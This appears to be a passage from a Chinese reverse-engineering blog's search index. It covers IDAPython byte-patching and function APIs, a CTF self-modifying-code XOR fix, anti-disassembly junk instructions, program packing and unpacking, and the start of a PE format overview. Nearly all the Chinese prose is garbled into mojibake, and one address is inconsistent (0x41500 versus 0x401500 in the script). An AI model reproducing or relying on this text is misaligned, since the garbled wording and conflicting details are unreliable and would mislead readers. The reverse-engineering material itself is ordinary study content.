‡é€‰ä¸­ä¸¤è¡ŒåŠä»¥ä¸Šçš„ï¼Œä¸ç„¶å°±ä¼šè¿”å›0xffffffff è·å–åœ°å€çš„å€¼ è·å–åœ°å€çš„æ•°å€¼ ä»¥1å­—èŠ‚ä¸ºå•ä½è·å–å€¼ idc.get_wide_byte(addr) ä»¥2å­—èŠ‚(å­—)çš„å•ä½è·å–å€¼ idc.get_wide_word(addr) ä»¥4å­—èŠ‚çš„å•ä½è·å–å€¼ idc.get_wide_dword(addr) ä»¥8å­—èŠ‚çš„å•ä½è·å–å€¼ idc.get_qword(addr) å¾—åˆ°è¿è¡Œæ–­ç‚¹ä¹‹å‰çš„å¯„å­˜å™¨çš„å€¼ ea&#x3D;get_reg_value(â€œeaxâ€) ä»£ç å¦‚ä¸‹ 1234567import idc ea = idc.get_screen_ea()print(hex(idc.get_wide_byte(ea)))print(hex(idc.get_wide_word(ea)))print(hex(idc.get_wide_dword(ea)))print(hex(idc.get_qword(ea))) ä¿®æ”¹æŒ‡ä»¤çš„å€¼ ä½œç”¨ å‡½æ•° ä¿®æ”¹addråœ°å€çš„å€¼ä¸ºvalue.æ¯æ¬¡ä¿®æ”¹1ä¸ªå­—èŠ‚ ida_bytes.patch_byte(addr,value) æ¯æ¬¡ä¿®æ”¹2ä¸ªå­—èŠ‚ ida_bytes.patch_word(addr,value) æ¯æ¬¡ä¿®æ”¹4ä¸ªå­—èŠ‚ ida_bytes.patch_Dword(addr,value) æ¯æ¬¡ä¿®æ”¹8ä¸ªå­—èŠ‚ ida_bytes.patch_Qword(addr,value) æµ‹è¯•ä»£ç  123456ea = idc.get_screen_ea()value = idc.get_wide_byte(ea)print(&quot;æœªä¿®æ”¹=&#123;&#125;&quot;.format(hex(value)))ida_bytes.patch_byte(ea,0x90)value = idc.get_wide_byte(ea)print(&quot;ä¿®æ”¹å=&#123;&#125; &quot;.format(hex(value))) æ®µæ“ä½œ ä½œç”¨ å‡½æ•° è·å–æ®µçš„åå­—ï¼ˆå‚æ•°ä¸ºå½“å‰çš„åœ°å€ï¼‰ idc.get_segm_name(addr) è·å–æ®µçš„å¼€å§‹åœ°å€ idc.get_segm_start(addr) è·å–æ®µçš„ç»“æŸåœ°å€ idc.get_segm_end(addr) è·å–ç¬¬ä¸€ä¸ªæ®µ idc.get_first_seg(addr) è·å–ä¸‹ä¸€ä¸ªæ®µ idc.get_next_seg(addr) è¿”å›ä¸€ä¸ªåˆ—è¡¨è®°å½•æ‰€æœ‰æ®µçš„åœ°å€ idautil.Segments() ä»£ç  12345for seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) print(&quot;æ®µå = &#123;&#125; èµ·å§‹åœ°å€= &#123;&#125; ç»“æŸåœ°å€ = &#123;&#125; &quot;.format(segname,hex(segstart),hex(segend))); å‡½æ•°æ“ä½œ ä½œç”¨ å‡½æ•° è·å–æŒ‡å®šåœ°å€ä¹‹é—´çš„æ‰€æœ‰å‡½æ•° idautils.Functions(startaddr,endaddr) è·å–æŒ‡å®šåœ°å€çš„å‡½æ•°å idc.get_func_name(addr) è·å–å‡½æ•°çš„æ³¨é‡Š get_func_cmt(addr, repeatable) repeatable:0&#x2F;1 0æ˜¯è·å–å¸¸è§„æ³¨é‡Š 1æ˜¯è·å–é‡å¤æ³¨é‡Š è®¾ç½®å‡½æ•°æ³¨é‡Š idc.set_func_cmt(ea, cmt, repeatable) å¼¹å‡ºæ¡†æ¡†è¦æ±‚ç”¨æˆ·è¿›è¡Œé€‰æ‹© å‚æ•°åˆ™æ˜¯ä¿¡æ¯ idc.choose_func(title) è¿”å›: addr è·ç¦»å‡½æ•°çš„åç§»å½¢å¼ idc.get_func_off_str(addr) å¯»æ‰¾å‡½æ•°ç»“å°¾,å¦‚æœå‡½æ•°å­˜åœ¨åˆ™è¿”å›ç»“å°¾åœ°å€,å¦åˆ™è¿”å›BADADDR idc.find_func_end(addr) è®¾ç½®å‡½æ•°ç»“å°¾ ida_funcs.set_func_end(ea, newend) newend:æ–°çš„ç»“æŸåœ°å€ è®¾ç½®å‡½æ•°å¼€å¤´ ida_funcs.set_func_start(addr, newstart) è®¾ç½®åœ°å€å¤„çš„åå­— idc.set_name(ea, name, SN_CHECK) Exå‡½æ•°ä¹Ÿä½¿ç”¨set_name è·å–é¦–ä¸ªå‡½æ•° idc.get_prev_func(ea) è·å–ä¸‹ä¸€ä¸ªå‡½æ•° idc.get_next_func(ea) ä»£ç ï¼š 12345678910111213141516for seg in idautils.Segments(): segname = idc.get_segm_name(seg) segstart = idc.get_segm_start(seg) segend = idc.get_segm_end(seg) if (segname == &#x27;.text&#x27;): for funcaddr in Functions(segstart,segend): funname = idc.get_func_name(funcaddr) funend = idc.find_func_end(funcaddr) funnext = idc.get_next_func(funcaddr) funnextname = idc.get_func_name(funnext) print(&quot;å½“å‰å‡½æ•°å = &#123;&#125; å½“å‰ç»“æŸåœ°å€ = &#123;&#125; ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ = &#123;&#125; ä¸‹ä¸€ä¸ªå‡½æ•°å= &#123;&#125; &quot;.format(funname,hex(funend),hex(funnext),funnextname)) ea = idc.get_screen_ea()funnextoffset = idc.get_func_off_str(ea)print(&quot;å½“å‰é€‰æ‹©åœ°å€è·ç¦»å½“å‰å‡½æ•°çš„åç§»ä¸º: &#123;&#125; &quot;.format(funnextoffset)) ç»ƒæ‰‹ç½‘é¼æ¯ 2020 é’é¾™ç»„ Jockerè¿˜æ˜¯æœ€å¼€å§‹çš„é‚£é“ç¨‹åº å¯ä»¥çœ‹åˆ°encryptå‡½æ•°å»å¼‚æˆ–0x41ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„SMC(self modifying code)æ“ä½œã€‚æˆ‘ä»¬è¦åšçš„å°±æ˜¯è®©è¿™æ®µforå¾ªç¯è¿è¡Œèµ·æ¥ï¼Œå¯ä»¥åŠ¨æ€è°ƒè¯•æˆ–è€…å†™ida pythonè„šæœ¬è¿è¡Œã€‚è¿™é‡Œä¸å†è®²åŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ‰¾åˆ°encryptå‡½æ•°çš„åœ°å€ï¼Œæ¥ç€å»è·å–è¯¥åœ°å€å¤„çš„å€¼ï¼Œå¼‚æˆ–0x41æ¥è¿˜åŸå³å¯ã€‚ encryptçš„åœ°å€ï¼š0x41500 è„šæœ¬ï¼š 1234addr = 0x401500for i in range(187): value = idc.get_wide_byte(addr + i) ida_bytes.patch_byte(addr + i, value ^ 0x41) ä¹‹åé€‰ä¸­æ•´æ®µå‡½æ•°ï¼Œé‡æ–°åˆ†æï¼ˆå¿«æ·é”®Cï¼‰ï¼Œä¹‹åç”Ÿæˆå‡½æ•°ï¼ˆå¿«æ·é”®Pï¼‰ï¼Œå³å¯è¿˜åŸå‡½æ•°","categories":[{"name":"è„šæœ¬å·¥å…·","slug":"è„šæœ¬å·¥å…·","permalink":"https://e1ectr0nlc.github.io/categories/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"èŠ±æŒ‡ä»¤åˆæ¢","slug":"ä»£ç ä¿æŠ¤--èŠ±æŒ‡ä»¤","date":"2021-10-11T16:00:00.000Z","updated":"2024-05-12T13:37:47.044Z","comments":true,"path":"2021/10/12/ä»£ç ä¿æŠ¤--èŠ±æŒ‡ä»¤/","permalink":"https://e1ectr0nlc.github.io/2021/10/12/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4--%E8%8A%B1%E6%8C%87%E4%BB%A4/","excerpt":"èŠ±æŒ‡ä»¤çš„ä½œç”¨æ˜¯ç”¨æ¥éšè—åæ±‡ç¼–åçš„ä»£ç ï¼Œå¯¹äºåŠ¨æ€è°ƒè¯•æ¥è¯´æ— æ³•éšè—ï¼Œä½†æ˜¯å¯¹äºé™æ€åˆ†ææ¥è¯´å°±æˆä¸ºå¿…é¡»ç»•è¿‡å»çš„ä¸€ä¸ªé—®é¢˜ã€‚","text":"èŠ±æŒ‡ä»¤çš„ä½œç”¨æ˜¯ç”¨æ¥éšè—åæ±‡ç¼–åçš„ä»£ç ï¼Œå¯¹äºåŠ¨æ€è°ƒè¯•æ¥è¯´æ— æ³•éšè—ï¼Œä½†æ˜¯å¯¹äºé™æ€åˆ†ææ¥è¯´å°±æˆä¸ºå¿…é¡»ç»•è¿‡å»çš„ä¸€ä¸ªé—®é¢˜ã€‚ èŠ±æŒ‡ä»¤å¦‚ä½•å®ç°ä»£ç éšè—èŠ±æŒ‡ä»¤èƒ½æˆåŠŸå¹²æ‰°åç¼–è¯‘å™¨è¯†åˆ«ä»£ç ï¼Œä¸»è¦æ˜¯ä¸åç¼–è¯‘å™¨çš„å®ç°æŠ€æœ¯æœ‰å…³ã€‚ä¸»æµåç¼–è¯‘å™¨ä½¿ç”¨ä¸¤ç§æ–¹æ³•è¿›è¡Œåæ±‡ç¼–æ“ä½œï¼Œåˆ†åˆ«æ˜¯çº¿æ€§æ‰«æå’Œé€’å½’ä¸‹é™ã€‚ çº¿æ€§æ‰«æä¹‹æ‰€ä»¥å«çº¿æ€§æ‰«æï¼Œå°±æ˜¯è¯´åƒä¸€æ¡çº¿ä¸€æ ·ä»å¤´æ‰«åˆ°å°¾ã€‚çº¿æ€§æ‰«æåæ±‡ç¼–ä»ä¸€ä¸ªä»£ç æ®µçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä»¥çº¿æ€§æ¨¡å¼æ‰«ææ•´ä¸ªä»£ç æ®µï¼Œé€æ¡åæ±‡ç¼–æ¯æ¡æŒ‡ä»¤ï¼Œç›´åˆ°å®Œæˆæ•´ä¸ªä»£ç æ®µ ä¼˜ç‚¹ï¼šèƒ½å¤Ÿå®Œå…¨è¦†ç›–ç¨‹åºçš„æ‰€æœ‰ä»£ç æ®µ ç¼ºç‚¹ï¼šæ²¡æœ‰è€ƒè™‘åˆ°ä»£ç ä¸­å¯èƒ½æ··æœ‰æ•°æ® é€’å½’ä¸‹é™é€’å½’ä¸‹é™åæ±‡ç¼–å¼ºè°ƒæ§åˆ¶æµçš„æ¦‚å¿µã€‚æ ¹æ®ä¸€æ¡æŒ‡ä»¤æ˜¯å¦è¢«å¦ä¸€æ¡æŒ‡ä»¤å¼•ç”¨æ¥å†³å®šæ˜¯å¦è¿›è¡Œåæ±‡ç¼–ã€‚ ä¼˜ç‚¹ï¼šå®ƒå…·æœ‰åŒºåˆ†ä»£ç ä¸æ•°æ®çš„å¼ºå¤§èƒ½åŠ›ã€‚ä½œä¸ºä¸€ç§åŸºäºæ§åˆ¶æµçš„ç®—æ³•ï¼Œå®ƒå¾ˆå°‘ä¼šåœ¨åæ±‡ç¼–è¿‡ç¨‹ä¸­é”™è¯¯åœ°å°†æ•°æ®å€¼ä½œä¸ºä»£ç å¤„ç†ã€‚ ç¼ºç‚¹ï¼šå®ƒæ— æ³•å¤„ç†é—´æ¥ä»£ç è·¯å¾„ï¼Œå¦‚åˆ©ç”¨æŒ‡é’ˆè¡¨æ¥æŸ¥æ‰¾ç›®æ ‡åœ°å€çš„è·³è½¬æˆ–è°ƒç”¨ã€‚ è€ŒèŠ±æŒ‡ä»¤å°±æ˜¯åˆ©ç”¨è¿™ä¸¤ç§æ–¹æ³•çš„ç¼ºç‚¹æ¥å®ç°ã€‚æˆ‘è§‰å¾—å¤§å®¶åç¼–è¯‘çš„å·¥å…·ä¸€èˆ¬æ˜¯IDA Proï¼Œåœ¨è®¾è®¡è¿™ç±»èŠ±æŒ‡ä»¤æ—¶è¦é€šè¿‡æ„é€  å¿…ç„¶æ¡ä»¶ æˆ–è€… äº’è¡¥æ¡ä»¶ï¼Œä½¿å¾—ç¨‹åºåœ¨å®é™…æ‰§è¡Œæ—¶ç»•è¿‡åƒåœ¾æ•°æ®ï¼Œè¿™æ ·ä¸ä¼šå½±å“ç¨‹åºæ­£å¸¸æ‰§è¡Œ å¸¸è§èŠ±æŒ‡ä»¤ç›¸åŒç›®æ ‡çš„è·³è½¬æŒ‡ä»¤åœ¨åæ±‡ç¼–è¿‡ç¨‹ä¸­é‡åˆ° jzï¼ˆè·³è½¬åˆ°ç›®æ ‡åœ°å€ä¸ºé›¶çš„æƒ…å†µä¸‹æ‰§è¡Œï¼‰å’Œ jnzï¼ˆè·³è½¬åˆ°ç›®æ ‡åœ°å€ä¸ä¸ºé›¶çš„æƒ…å†µä¸‹æ‰§è¡Œï¼‰æŒ‡ä»¤æ—¶ï¼Œå¦‚æœå®ƒä»¬çš„ç›®æ ‡åœ°å€ç›¸åŒï¼Œé‚£ä¹ˆç¨‹åºå®é™…ä¸Šå°±æ˜¯è¦æ‰§è¡Œä¸€ä¸ªæ— æ¡ä»¶è·³è½¬ï¼Œç›¸å½“äº jmp æŒ‡ä»¤ã€‚ç„¶è€Œï¼ŒIDA Pro åœ¨åæ±‡ç¼–æ—¶å¯èƒ½ä¼šè¯¯å°† jnz åé¢çš„æŒ‡ä»¤ä¹Ÿåæ±‡ç¼–å‡ºæ¥ï¼Œå°½ç®¡å®é™…ä¸Šè¿™äº›æŒ‡ä»¤å¹¶ä¸ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºç¨‹åºåœ¨é‡åˆ° jnz æŒ‡ä»¤æ—¶å·²ç»è·³è½¬äº†ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœåé¢ç´§è·Ÿç€çš„æ˜¯ä¸€äº›å­—èŠ‚æŒ‡ä»¤ï¼ˆå¦‚ call æˆ– jmp æŒ‡ä»¤ï¼‰ï¼ŒIDA Pro å¯èƒ½ä¼šå°†å®ƒä»¬é”™è¯¯åœ°è§£é‡Šä¸ºä¸ jnz ç›¸å…³çš„æŒ‡ä»¤ï¼Œå¯¼è‡´åæ±‡ç¼–ç»“æœå‡ºç°é—®é¢˜ã€‚ ä¾‹å¦‚å‡è®¾åŸå§‹æœºå™¨ç å¦‚ä¸‹ 1234574 03 ; jz ç›®æ ‡åœ°å€ä¸ºå½“å‰åœ°å€ + 375 01 ; jnz ç›®æ ‡åœ°å€ä¸ºå½“å‰åœ°å€ + 1E8 58 ; call ç›®æ ‡åœ°å€ä¸ºå½“å‰åœ°å€ + 58C3 ; ret90 90 ; nop è¿™é‡Œçš„callæŒ‡ä»¤å³ä¸ºæ— ç”¨æ•°æ®ï¼Œåªéœ€è¦å°†callæŒ‡ä»¤è½¬ä¸ºdataæ•°æ®å†åç¼–è¯‘å³å¯ å›ºå®šæ¡ä»¶çš„è·³è½¬æŒ‡ä»¤å½“æ¡ä»¶æ»¡è¶³æ—¶ï¼Œç›¸åº”çš„åˆ¤æ–­è¯­å¥åé¢çš„ä»£ç å°†ä¼šæ‰§è¡Œï¼Œè€Œå½“æ¡ä»¶ä¸æ»¡è¶³æ—¶ï¼Œä¸ä¹‹å¯¹åº”çš„ä»£ç åˆ™ä¸ä¼šæ‰§è¡Œã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ªæ°¸çœŸè¯­å¥ï¼Œåé¢çš„ä»£ç ä¸€å®šä¼šæ‰§è¡Œï¼Œè‹¥æ˜¯å°†è¦æ‰§è¡Œçš„ä»£ç åç»§ç»­è·Ÿæ— æ¡ä»¶è·³è½¬è¯­å¥ï¼Œidaåˆ™ä¼šè¯†åˆ«å‡ºé”™ã€‚ ä¾‹å¦‚ 123433 C0 ; xor eax, eax74 01 ; jz ç›®æ ‡åœ°å€ä¸ºå½“å‰åœ°å€ + 1E9 58 ; jmp ç›®æ ‡åœ°å€ä¸ºå½“å‰åœ°å€ + 58C3 ; ret åœ¨è¿™ä¸ªä¾‹å­ä¸­xorç»“æŸzfæ ‡å¿—ä½ä¸€å®šä¼šè¢«ç½®1ï¼Œjzè·³è½¬æˆç«‹ï¼Œè€Œjmpåˆ™ä¸ä¼šæ‰§è¡Œã€‚æ›´æ”¹æ–¹æ³•æ˜¯å°†jmp è¿™è¡Œä»£ç nopæˆ–æ”¹ä¸ºdata å‡½æ•°è·³è½¬å‡½æ•°è°ƒç”¨æ—¶å°†è°ƒç”¨æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€å‹æ ˆï¼Œç„¶åè·³è½¬åˆ°å‡½æ•°ä½ç½®æ‰§è¡Œï¼Œç›¸å½“äºï¼šPUSH ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ã€MOV EIP,å‡½æ•°ä½ç½®ï¼Œç›¸åº”åœ°ï¼Œå‡½æ•°è¿”å›æ—¶å°†å‡½æ•°è°ƒç”¨æ—¶çš„å‹æ ˆåœ°å€æ¢å¤ç»™EIPï¼Œç›¸å½“äºPOP EIPã€‚å¦‚æœç ´ç¯äº†å…¶ä¸­çš„å †æ ˆå¹³è¡¡ï¼Œidaå°±ä¼šæŠ¥é”™ã€‚ ä¾‹å¦‚ï¼š 1234call label ;è°ƒç”¨labelå‡½æ•°label: ;å‡½æ•°ä½“add [esp],5 ;æ ˆé¡¶åŠ 5ret ;è¿”å› è‡³äºæ ˆé¡¶çš„è¿”å›åœ°å€è¦åŠ å¤šå°‘ï¼Œè¿™å–å†³äºè·¨è¿‡è¯­å¥çš„é•¿åº¦ã€‚æ­¤å¤„æ„é€ RETè¿”å›çš„ä½ç½®å’Œæ­£å¸¸RETè¿”å›çš„ä½ç½®ç›¸å·®5ä¸ªå­—èŠ‚ï¼Œå› æ­¤æ ˆé¡¶æ•°æ®åŠ ä¸Š5ä¸ªå­—èŠ‚","categories":[{"name":"ä»£ç ä¿æŠ¤","slug":"ä»£ç ä¿æŠ¤","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"ç¨‹åºåŠ å£³ä¸è„±å£³","slug":"ç¨‹åºåŠ å£³ä¸è„±å£³","date":"2021-10-11T16:00:00.000Z","updated":"2024-05-12T12:28:23.567Z","comments":true,"path":"2021/10/12/ç¨‹åºåŠ å£³ä¸è„±å£³/","permalink":"https://e1ectr0nlc.github.io/2021/10/12/%E7%A8%8B%E5%BA%8F%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/","excerpt":"ç¨‹åºåŠ å£³ä¸»è¦åˆ†ä¸ºå‹ç¼©å£³ã€åŠ å¯†å£³ï¼Œå¤šå±‚å£³ç­‰ç­‰ï¼Œç›®çš„éƒ½æ˜¯ä¸ºäº†éšè—ç¨‹åºçœŸæ­£çš„å…¥å£ç‚¹OEPï¼Œé˜²æ­¢é€†å‘äººå‘˜è½»æ¾åˆ†æç¨‹åºä»£ç ã€‚","text":"ç¨‹åºåŠ å£³ä¸»è¦åˆ†ä¸ºå‹ç¼©å£³ã€åŠ å¯†å£³ï¼Œå¤šå±‚å£³ç­‰ç­‰ï¼Œç›®çš„éƒ½æ˜¯ä¸ºäº†éšè—ç¨‹åºçœŸæ­£çš„å…¥å£ç‚¹OEPï¼Œé˜²æ­¢é€†å‘äººå‘˜è½»æ¾åˆ†æç¨‹åºä»£ç ã€‚ æ¦‚å¿µå£³æœ€å¼€å§‹çš„ç›®çš„æ˜¯ä¸ºäº†è®©é€†å‘åˆ†æäººå‘˜æ— æ³•è½»æ˜“è·å–ç¨‹åºçš„å…¥å£å‡½æ•°ï¼Œåœ¨é™æ€åˆ†ææ—¶ä¹Ÿèƒ½éšè—å†…éƒ¨ä»£ç ï¼Œ å±äºä»£ç ä¿æŠ¤æŠ€æœ¯ã€‚ åŠ å£³è½¯ä»¶ä¸æŸ¥å£³è½¯ä»¶ åŠ å£³ï¼šASPACKï¼ŒUPXï¼Œ PEcompactï¼ŒPE-PACKï¼› PETITE NEOLITEç­‰ ä¸€èˆ¬ç”¨æ¥åŠ å£³çš„ä¹Ÿå¯ä»¥ç”¨æ¥è„±å£³ æŸ¥å£³ï¼š Fi ï¼ŒGetTyp ï¼Œpeid ï¼Œpe-scanç­‰ å¦‚ä½•è¯†åˆ«OEPè¿™é‡Œåªåˆ†äº«ç¬”è€…é‡åˆ°è¿‡çš„åŠ å£³è½¯ä»¶ä¸­çš„OEPç‰¹å¾ã€‚ å…³é”®è¯PUSHADï¼Œå°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼ŒPOPADä¸PUSHADç›¸å¯¹åº”ï¼Œå°†æ‰€æœ‰å¯„å­˜å™¨å¼¹å‡ºï¼Œä¸€èˆ¬è¿è¡Œåˆ°POPADè¯´æ˜OEPå·²ç»ä¸è¿œäº†ã€‚ è§‚å¯Ÿåœ°å€ï¼Œä¸€èˆ¬å£³ç¨‹åºçš„åœ°å€æ¯”æºç¨‹åºçš„åœ°å€è¦å¤§ï¼Œä¹Ÿå°±æ˜¯æºç¨‹åºåœ¨å£³ç¨‹åºçš„ä¸Šæ–¹ï¼Œå½“ç»è¿‡äº†ä¸€ä¸ªå¤§è·³è½¬åˆ°è¾¾åŸæœ¬è°ƒè¯•çš„åœ°å€ä¸Šæ–¹ï¼ŒåŒæ—¶è§‚å¯Ÿåˆ°æœ‰PUSH EBPç­‰å¼€è¾Ÿæ ˆå¸§çš„è¯­å¥å‡ºç°ï¼Œå¤§æ¦‚ç‡å·²ç»åˆ°è¾¾äº†OEP è„±å£³æ–¹æ³•å½“é‡åˆ°æ— æ³•ä½¿ç”¨å·¥å…·å¸®åŠ©æˆ‘ä»¬è§£å†³å£³æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ‰‹è„±æ–¹æ³•è¿›è¡Œè„±å£³ã€‚åŠ å£³ç›¸å½“äºåœ¨ç¨‹åºå¤–å¥—äº†å¦å¤–ä¸€å±‚ç¨‹åºï¼Œå½“ç¨‹åºè¿è¡Œèµ·æ¥æ—¶å£³å…ˆè·å–åˆ°ç¨‹åºæ§åˆ¶æƒï¼Œå°†å£³ç¨‹åºè¿è¡Œç»“æŸï¼ˆè‡ªè§£å¯†é˜¶æ®µï¼‰ï¼Œå†æ¥ç€è¿è¡ŒåŸç¨‹åºï¼Œè¿™æ—¶ç¨‹åºå°±æ‰§è¡Œåˆ°äº†OEPä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªæ—¶æœºä¸‹dumpæºç¨‹åºã€‚ å•æ­¥è·Ÿè¸ªè¿™æ˜¯æœ€ç¬¨çš„æ–¹æ³•ï¼Œåœ¨è°ƒè¯•å™¨ä¸­å•æ­¥è¿è¡Œï¼Œä¸æ–­å•æ­¥æ­¥å…¥æˆ–æ­¥è¿‡ï¼Œç›´åˆ°åˆ°è¾¾OEPå½“ä¸­ã€‚ ESPå®šå¾‹åŸç†æ˜¯åˆ©ç”¨äº†ç¨‹åºå †æ ˆå¹³è¡¡ã€‚åœ¨ç¨‹åºè‡ªè§£å¯†æ—¶éœ€è¦å…ˆä¿å­˜å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œä¼šè¿›è¡Œå‹æ ˆæ“ä½œï¼Œè€Œå½“è‡ªè§£å¯†å®Œæˆéœ€è¦è¿˜åŸç°åœºæ—¶ï¼Œä¼šå°†åŸæ¥å‹æ ˆçš„å¯„å­˜å™¨éƒ½å¼¹å‡ºï¼ŒåŸç¨‹åºä»£ç æ¢å¤ã€‚æ­¤æ—¶ç¡¬ä»¶æ–­ç‚¹è§¦å‘ã€‚ç„¶ååœ¨ç¨‹åºå½“å‰ä½ç½®ï¼Œåªéœ€è¦å°‘è®¸å•æ­¥è·Ÿè¸ªï¼Œå°±å¾ˆå®¹æ˜“åˆ°è¾¾æ­£ç¡®çš„OEPä½ç½®ã€‚ å…³é”®è¯æœç´¢æ ¹æ®æ‰€è¦è„±å£³ç¨‹åºçš„è„±å£³ç‰¹å¾ï¼Œå®šä½åˆ°è·ç¦»OEPæœ€è¿‘çš„æ±‡ç¼–ï¼Œä¸‹æ–­ç‚¹ï¼Œå†è¿è¡Œç¨‹åºåˆ°OEPä¹‹ådumpã€‚ä¾‹å¦‚UPXå¯ä»¥å®šä½æ±‡ç¼–åˆ°popadé™„è¿‘ï¼ŒOEPè·ç¦»popadçš„è·ç¦»å¾ˆè¿‘","categories":[{"name":"ä»£ç ä¿æŠ¤","slug":"ä»£ç ä¿æŠ¤","permalink":"https://e1ectr0nlc.github.io/categories/%E4%BB%A3%E7%A0%81%E4%BF%9D%E6%8A%A4/"}],"tags":[]},{"title":"Peæ–‡ä»¶ç»“æ„","slug":"PEæ–‡ä»¶ç»“æ„","date":"2021-09-19T16:00:00.000Z","updated":"2024-05-12T12:51:17.063Z","comments":true,"path":"2021/09/20/PEæ–‡ä»¶ç»“æ„/","permalink":"https://e1ectr0nlc.github.io/2021/09/20/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/","excerpt":"å¯æ‰§è¡Œæ–‡ä»¶æ˜¯æŒ‡å¯ä»¥ç”±æ“ä½œç³»ç»Ÿç›´æ¥åŠ è½½æ‰§è¡Œçš„æ–‡ä»¶ï¼Œè€ŒPEæ–‡ä»¶æ˜¯Windowsä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚æˆ‘ä»¬æ—¢ç„¶è¦å­¦ä¹ PEæ–‡ä»¶ï¼Œäº†è§£æ–‡ä»¶æ ¼å¼å°±æ˜¯å¿…é¡»çš„ã€‚æˆ‘ä»¬ä¸€èˆ¬ç§°å…·æœ‰PEç»“æ„çš„æ–‡ä»¶ä¸ºPEæ–‡ä»¶ï¼Œå¸¸è§çš„æœ‰EXEã€DLLã€‚ä¸€ä¸ªå®Œæ•´çš„PEæ–‡ä»¶ä¸»è¦æœ‰å››éƒ¨åˆ†ç»„æˆï¼šDOSå¤´ï¼ŒNTå¤´ï¼ŒèŠ‚è¡¨ä»¥åŠèŠ‚æ•°æ®ã€‚","text":"å¯æ‰§è¡Œæ–‡ä»¶æ˜¯æŒ‡å¯ä»¥ç”±æ“ä½œç³»ç»Ÿç›´æ¥åŠ è½½æ‰§è¡Œçš„æ–‡ä»¶ï¼Œè€ŒPEæ–‡ä»¶æ˜¯Windowsä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚æˆ‘ä»¬æ—¢ç„¶è¦å­¦ä¹ PEæ–‡ä»¶ï¼Œäº†è§£æ–‡ä»¶æ ¼å¼å°±æ˜¯å¿…é¡»çš„ã€‚æˆ‘ä»¬ä¸€èˆ¬ç§°å…·æœ‰PEç»“æ„çš„æ–‡ä»¶ä¸ºPEæ–‡ä»¶ï¼Œå¸¸è§çš„æœ‰EXEã€DLLã€‚ä¸€ä¸ªå®Œæ•´çš„PEæ–‡ä»¶ä¸»è¦æœ‰å››éƒ¨åˆ†ç»„æˆï¼šDOSå¤´ï¼ŒNTå¤´ï¼ŒèŠ‚è¡¨ä»¥åŠèŠ‚æ•°æ®ã€‚ PEæ–‡ä»¶ç»“æ„è¯´æ˜DOSå¤´DOSå¤´ æ˜¯ç”¨æ¥å…¼å®¹ MS-DOS æ“ä½œç³»ç»Ÿçš„ï¼Œç›®çš„æ˜¯å½“è¿™ä¸ªæ–‡ä»¶åœ¨ MS-DOS ä¸Šè¿è¡Œæ—¶æç¤ºä¸€æ®µæ–‡å­—ï¼šThis program cannot be run in DOS mode. è¿˜æœ‰ä¸€ä¸ªç›®çš„ï¼Œå°±æ˜¯æŒ‡æ˜ NT å¤´åœ¨æ–‡ä»¶ä¸­çš„ä½ç½®ã€‚ NTå¤´NTå¤´ åŒ…å« windows PE æ–‡ä»¶çš„ä¸»è¦ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª â€˜PEâ€™ å­—æ ·çš„ç­¾åï¼ŒPEæ–‡ä»¶å¤´ï¼ˆIMAGE_FILE_HEADERï¼‰å’Œ PEå¯é€‰å¤´ï¼ˆIMAGE_OPTIONAL_HEADER32ï¼‰ã€‚ èŠ‚è¡¨èŠ‚è¡¨æ˜¯ PE æ–‡ä»¶åç»­èŠ‚çš„æè¿°ï¼Œwindows æ ¹æ®èŠ‚è¡¨çš„æè¿°åŠ è½½æ¯ä¸ªèŠ‚ã€‚ èŠ‚æ•°æ®æ¯ä¸ªèŠ‚å®é™…ä¸Šæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå¯ä»¥åŒ…å« ä»£ç ã€æ•°æ® ç­‰ç­‰ï¼Œæ¯ä¸ªèŠ‚å¯ä»¥æœ‰ç‹¬ç«‹çš„å†…å­˜æƒé™ï¼Œæ¯”å¦‚ä»£ç èŠ‚é»˜è®¤æœ‰è¯»&#x2F;æ‰§è¡Œæƒé™ï¼ŒèŠ‚çš„åå­—å’Œæ•°é‡å¯ä»¥è‡ªå·±å®šä¹‰ã€‚ DOSå¤´é¦–å…ˆçœ‹åˆ°æ–‡ä»¶å‰ä¸¤ä¸ªå­—èŠ‚4D 5Aä¹Ÿå°±æ˜¯â€MZâ€ï¼Œâ€œMZâ€æ˜¯MS-DOSå¼€å‘è€…ä¹‹ä¸€çš„é©¬å…‹Â·èŒ¨æŸå…‹æ²ƒæ–¯åŸºï¼ˆMark Zbikowskiï¼‰çš„å§“åé¦–å­—æ¯ç¼©å†™ã€‚PEæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä½äºä¸€ä¸ªä¼ ç»Ÿçš„MS-DOSå¤´éƒ¨ï¼Œå«ä½œIMAGE_DOS_HEADERDOSï¼Œä¸»è¦æ˜¯ä¸ºäº†å‘åå…¼å®¹ä»¥å‰çš„DOSç³»ç»Ÿï¼ŒDOSéƒ¨åˆ†å¯ä»¥åˆ†ä¸ºDOS 